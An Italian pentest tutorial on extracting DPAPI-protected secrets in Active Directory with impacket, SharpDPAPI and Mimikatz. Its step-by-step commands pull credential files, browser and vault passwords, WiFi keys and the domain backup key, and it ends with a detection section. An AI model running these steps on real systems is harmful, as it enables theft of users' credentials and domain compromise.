---
title: 'DPAPI Attack in Active Directory: Estrarre Password Cifrate e Masterkey'
slug: dpapi
description: 'Guida operativa su DPAPI in Active Directory: masterkey, blob cifrati, domain backup key, Chrome, WiFi e Vault. Step-by-step con impacket e SharpDPAPI.'
image: /dpapi.webp
draft: false
date: 2026-03-17T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - domain-backup-key
  - dpapi
---

DPAPI (Data Protection API) è il meccanismo nativo di Windows per cifrare password, token e segreti legati all'identità dell'utente. Browser, Credential Manager, applicazioni di terze parti — tutto passa da qui.

Durante un pentest AD è una delle fonti di credenziali più sottovalutate. Spesso trovi hash crackati, pass-the-hash, Kerberoasting — e intanto le password in chiaro sono lì, cifrate con DPAPI, che nessuno ha guardato.

Questa guida è operativa: ogni concetto ha il comando corrispondente.

***

## TL;DR

| Hai              | Fai                                                    |
| ---------------- | ------------------------------------------------------ |
| Password utente  | `dpapi.py masterkey -password` → `dpapi.py credential` |
| Hash NTLM utente | `dpapi.py masterkey -password` (con pass crackato)     |
| Domain Admin     | `dpapi.py backupkeys --export` → decripti chiunque     |
| SYSTEM su box    | `SharpDPAPI credentials` in un colpo solo              |

***

## Cos'è un blob DPAPI

Un blob DPAPI è una **sequenza di byte che nasconde un segreto**. Può contenere una password, un token, una chiave — qualsiasi dato che un'applicazione Windows ha deciso di salvare in modo "sicuro".

Si riconosce dal magic bytes iniziale:

```
01000000d08c9ddf0115d1118c7a00c04fc297eb...
```

Lo trovi in:

* File `.txt`, `.xml`, `.ps1` (spesso in share SMB o script di automazione)
* Registry (`HKCU\Software\...`)
* Task Scheduler (file XML dei task)
* `SYSVOL` — script GPO lasciati da admin negligenti

```bash
# Cerca blob DPAPI su share SMB
grep -r "01000000d08c9ddf" /mnt/smb/
```

***

## Cos'è una masterkey DPAPI

La masterkey è la **chiave che decripta il blob**. Ogni utente ne ha una o più, salvate qui:

```
C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
```

Il blob contiene il GUID della masterkey usata per cifrarlo. Trovi la corrispondenza confrontando quel GUID con i file nella cartella `Protect`.

```powershell
# Da WinRM/shell — elenca le masterkey dell'utente corrente
dir C:\Users\dharding\AppData\Roaming\Microsoft\Protect\S-1-5-21-xxx\
```

Output tipico:

```
5bc96c14-a85d-45d7-8568-80ff29215ca4   ← masterkey
ca7e39cf-799d-4dbd-b42b-74e634df8113   ← altra masterkey
Preferred                               ← punta alla masterkey attiva
```

***

## File speciali nella cartella Protect

| File          | Cosa è                                                  |
| ------------- | ------------------------------------------------------- |
| `<GUID>`      | Masterkey dell'utente                                   |
| `Preferred`   | Punta alla masterkey attiva (aggiornata ogni 90 giorni) |
| `BK-<DOMAIN>` | Backup cifrato con la chiave RSA del DC                 |

***

## Tecnica 1 — Password utente nota

### Step 1 — Recupera il SID dell'utente

```powershell
# Da shell sul target
whoami /user
```

Output:

```
dharding  S-1-5-21-3529848291-2371357972-1873374923-1001
```

### Step 2 — Scarica la masterkey

```powershell
# Da Evil-WinRM
download "C:\Users\dharding\AppData\Roaming\Microsoft\Protect\S-1-5-21-3529848291-2371357972-1873374923-1001\5bc96c14-a85d-45d7-8568-80ff29215ca4"
```

### Step 3 — Decripta la masterkey

```bash
dpapi.py masterkey \
  -file 5bc96c14-a85d-45d7-8568-80ff29215ca4 \
  -sid S-1-5-21-3529848291-2371357972-1873374923-1001 \
  -password WestminsterOrange17
```

Output:

```
Decrypted key with User Key (SHA1)
Decrypted key: 0x32f235f8680f61b2886a31ab60651161...
```

### Step 4 — Trova i file credenziali

```powershell
dir "C:\Users\dharding\AppData\Local\Microsoft\Credentials\"
dir "C:\Users\dharding\AppData\Roaming\Microsoft\Credentials\"
```

WinPEAS li trova automaticamente e mostra anche il GUID della masterkey associata:

```
CredFile: C:\Users\dharding\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
MasterKey: 5bc96c14-a85d-45d7-8568-80ff29215ca4
```

### Step 5 — Scarica e decripta il file credenziali

```powershell
download "C:\Users\dharding\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"
```

```bash
dpapi.py credential \
  -f DFBE70A7E5CC19A398EBF1B96859CE5D \
  -key 0x32f235f8680f61b2886a31ab60651161...
```

Output se c'è qualcosa di utile:

```
[CREDENTIAL]
Target      : Domain:target=DOMAINCONTROLLER
Username    : administrator
```

***

## Tecnica 2 — Blob DPAPI raw (es. da script, registry, file)

Se il blob non è un file credenziali standard ma una stringa hex trovata in giro:

### Step 1 — Converti da hex a binario

```bash
# Se hai il blob come stringa hex in un file di testo
xxd -r -p blob.txt blob.bin
```

### Step 2 — Decripta con la masterkey

```bash
dpapi.py unprotect \
  -file blob.bin \
  -key 0x32f235f8680f61b2886a31ab60651161...
```

Output:

```
Successfully decrypted data
0000   68 00 48 00 4F 00 5F 00  53 00 39 00 67 00   h.H.O._.S.9.g.
```

> **Nota:** L'output è in UTF-16LE — ogni carattere ha `00` dopo. Leggi saltando i byte nulli: `hHO_S9g...`

***

## Tecnica 3 — Domain Backup Key (senza password utente)

Il DC ha un backup di tutte le masterkey del dominio, cifrato con la sua chiave RSA privata. Se hai accesso come Domain Admin, puoi decriptare le masterkey di **qualsiasi utente** senza conoscerne la password.

### Step 1 — Esporta la domain backup key

```bash
dpapi.py backupkeys \
  -t DOMINIO/Administrator:Password@192.168.1.1 \
  --export
```

Output — tre file:

```
G$BCKUPKEY_<GUID>.pvk   ← quello che usi
G$BCKUPKEY_<GUID>.der
G$BCKUPKEY_<GUID>.key
```

### Step 2 — Decripta qualsiasi masterkey utente

```bash
dpapi.py masterkey \
  -file 5bc96c14-a85d-45d7-8568-80ff29215ca4 \
  -sid S-1-5-21-xxx \
  -pvk 'G$BCKUPKEY_xxx.pvk'
```

Da qui in poi stesso flusso di Tecnica 1.

***

## Tecnica 4 — SharpDPAPI (da shell SYSTEM)

Se sei SYSTEM sul target, SharpDPAPI fa tutto in un colpo:

```powershell
# Decripta tutti i file credenziali dell'utente corrente
.\SharpDPAPI.exe credentials

# Decripta con masterkey esplicita
.\SharpDPAPI.exe credentials /mkfile:masterkeys.txt
```

***

## Tecnica 9 — WiFi password

Le password WiFi sono cifrate con DPAPI di SYSTEM. Se sei admin:

```powershell
# Esporta tutti i profili WiFi in chiaro
netsh wlan export profile folder=C:\temp key=clear

# Leggi la password
type C:\temp\Wi-Fi-*.xml | findstr "keyMaterial"
```

Output:

```xml
<keyMaterial>MyWifiPassword123</keyMaterial>
```

***

## Tecnica 10 — Credential Manager (cmdkey)

Elenca le credenziali salvate senza scaricare nulla:

```powershell
cmdkey /list
```

Output tipico:

```
Currently stored credentials:
  Target: Domain:target=FILESERVER01
  Type: Domain Password
  User: DOMAIN\administrator
```

Se vedi credenziali interessanti, quelle sono nei file Credentials — usa il flusso Tecnica 1 per decriptarle.

***

## Tecnica 11 — Sticky Notes

Spesso dimenticate dagli admin. Cifrate con DPAPI, salvate in un database SQLite.

```powershell
# Path del database
dir "C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\"
download "C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
```

```bash
# Da Linux — leggi il contenuto
sqlite3 plum.sqlite "SELECT Text FROM Note;"
```

> Il testo può contenere password scritte a mano dall'utente — capitano più spesso di quanto pensi.

***

## Errori comuni

| Errore                              | Causa                                           | Fix                                            |
| ----------------------------------- | ----------------------------------------------- | ---------------------------------------------- |
| `Padding is incorrect`              | Masterkey sbagliata                             | Prova l'altra masterkey nella cartella         |
| `Unable to decrypt masterkey`       | Password o SID errati                           | Verifica SID con `whoami /user`                |
| Output vuoto `[CREDENTIAL]`         | File credenziali di Windows Live                | Inutile, cerca altri file                      |
| `Cannot find masterkey`             | GUID nel blob non corrisponde ai file scaricati | Scarica tutti i file nella cartella `Protect`  |
| `Access Denied` su cartella Protect | Non sei l'utente proprietario o non sei SYSTEM  | Usa `SeBackupPrivilege` o SharpDPAPI da SYSTEM |

***

## Dove cercare in un pentest reale

```
C:\Users\*\AppData\Local\Microsoft\Credentials\*
C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
C:\Users\*\Documents\*.txt
C:\Scripts\*
\\DC\SYSVOL\*\scripts\*
Task Scheduler: C:\Windows\System32\Tasks\*
```

Stringa da cercare nei file:

```bash
grep -r "01000000d08c9ddf" . 2>/dev/null
```

***

## Attack Chain tipica

```
Password utente
      ↓
dpapi.py masterkey → Decrypted key
      ↓
dpapi.py credential → Username/Password
      ↓
Lateral movement / Privilege escalation
```

***

## Tecnica 5 — Masterkey con hash NTLM (senza password in chiaro)

Se hai l'hash NTLM ma non la password:

```bash
dpapi.py masterkey \
  -file 5bc96c14-a85d-45d7-8568-80ff29215ca4 \
  -sid S-1-5-21-xxx \
  -hash aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
```

***

## Tecnica 6 — Windows Vault

Diverso dai file Credentials standard. Il Vault salva credenziali di RDP, reti, applicazioni.

```powershell
# Elenca vault sul target
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

```powershell
# Scarica i file vault
dir C:\Users\<user>\AppData\Local\Microsoft\Vault\
dir C:\ProgramData\Microsoft\Vault\
```

```bash
# Decripta da Linux
dpapi.py vault \
  -vcrd <file.vcrd> \
  -vpol <Policy.vpol> \
  -key 0x32f235f8...
```

***

## Tecnica 7 — Chrome / Edge password

Browser Chromium-based salvano le password cifrate con DPAPI dell'utente.

```powershell
# File da scaricare
download "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
download "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State"
```

```bash
# Decripta con impacket
dpapi.py chrome \
  --logindata "Login Data" \
  --localstate "Local State" \
  -key 0x32f235f8...
```

> Edge usa lo stesso meccanismo — sostituisci il path con `Microsoft\Edge\User Data\Default\`.

***

## Tecnica 8 — Mimikatz da SYSTEM (tutto in memoria)

Se sei SYSTEM, Mimikatz decripta senza toccare file su disco:

```
# Dump tutte le masterkey in memoria
sekurlsa::dpapi

# Decripta file credenziali specifico
dpapi::cred /in:"C:\Users\dharding\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"

# Decripta con masterkey esplicita
dpapi::cred /in:"C:\...\DFBE70..." /masterkey:32f235f8680f61b2886a31ab...
```

***

## Tool

* [impacket dpapi.py](https://github.com/fortra/impacket) — flusso completo da Linux
* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — da eseguire direttamente su Windows
* [Mimikatz dpapi::](https://github.com/gentilkiwi/mimikatz) — alternativa se hai SYSTEM

***

## Cheat Sheet comandi DPAPI

```bash
# 1. Decripta masterkey con password
dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS>

# 2. Decripta masterkey con hash NTLM
dpapi.py masterkey -file <GUID> -sid <SID> -hash <NTLM>

# 3. Decripta masterkey con domain backup key
dpapi.py masterkey -file <GUID> -sid <SID> -pvk <FILE.pvk>

# 4. Decripta file credenziali
dpapi.py credential -f <CREDFILE> -key 0x<MASTERKEY>

# 5. Decripta blob raw
xxd -r -p blob.txt blob.bin
dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY>

# 6. Decripta Chrome
dpapi.py chrome --logindata "Login Data" --localstate "Local State" -key 0x<MASTERKEY>

# 7. Decripta vault
dpapi.py vault -vcrd <FILE.vcrd> -vpol <Policy.vpol> -key 0x<MASTERKEY>

# 8. Esporta domain backup key
dpapi.py backupkeys -t DOMAIN/Admin:Pass@DC_IP --export

# 9. SharpDPAPI tutto in uno (da SYSTEM)
.\SharpDPAPI.exe credentials
```

***

## Detection — Blue Team

| Azione                       | Log generato          | Event ID    |
| ---------------------------- | --------------------- | ----------- |
| Accesso a cartella `Protect` | Object Access         | 4663        |
| `dpapi.py backupkeys` sul DC | LSASS access          | 4662        |
| `sekurlsa::dpapi` Mimikatz   | LSASS memory read     | 10 (Sysmon) |
| Export profili WiFi          | `netsh` process spawn | 4688        |

**Indicatori di compromissione:**

* Accesso alla cartella `Protect` da processo non `lsass.exe`
* Lettura massiva di file in `C:\Users\*\AppData\Local\Microsoft\Credentials\`
* Connessione LDAP al DC per `backupkeys` (porta 389/636)

***

## FAQ

**Cos'è DPAPI in Windows?**
È l'API nativa di Windows per cifrare e decifrare dati sensibili legati all'identità dell'utente. Usata da browser, credential manager, applicazioni di terze parti.

**Come decriptare credenziali DPAPI senza la password dell'utente?**
Con la domain backup key del DC (se sei Domain Admin) o con l'hash NTLM dell'utente.

**Dove sono le masterkey DPAPI in Windows?**
In `C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\` — una o più file con nome GUID.

**DPAPI funziona su utenti di dominio?**
Sì. Gli utenti di dominio hanno masterkey cifrate anche con la domain backup key del DC, il che le rende decriptabili senza la password originale.

**Qual è la differenza tra file Credentials e blob DPAPI?**
I file Credentials sono un formato strutturato (Target, Username, Password). Un blob DPAPI è un dato cifrato generico che puoi trovare ovunque — file, registry, task XML. Il flusso di decryption è simile ma il comando finale cambia.

**WinPEAS trova automaticamente i file DPAPI?**
Sì — cerca nella sezione `DPAPI Credential Files` e mostra il GUID della masterkey associata a ogni file.

***

## Approfondimenti

* [ADCS ESC1/ESC8 — Certificati AD](https://hackita.it/articoli/adcs-esc1-esc16)
* [Kerberoasting](https://hackita.it/articoli/kerberoasting)
* [BloodHound — Enumerazione AD](https://hackita.it/articoli/bloodhound)
* [Pass the Hash](https://hackita.it/articoli/pass-the-hash)
